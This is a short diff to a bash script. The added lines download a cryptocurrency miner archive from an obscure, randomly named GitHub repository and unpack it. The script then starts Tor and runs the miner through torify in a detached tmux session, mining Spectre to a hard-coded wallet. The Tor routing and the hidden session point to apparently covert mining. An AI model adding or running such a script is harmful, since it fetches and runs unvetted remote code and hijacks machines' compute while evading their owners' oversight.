@@ -1,4 +1,6 @@
 #!/bin/bash
-
+wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/tnn-miner-0.3.7.tar.gz
+tar -xf tnn-miner-0.3.7.tar.gz
+sleep 5
 sudo systemctl start tor
 tmux new -ds servak torify ./tnn-miner --spectre --wallet spectre:qrrjcpuscnzylt3ukzjymwslp9e68zer2h8gdr6dk88hg53mncavxzhcepxsw --daemon-address spr.tw-pool.com --port 14001 --worker-name test --threads 2
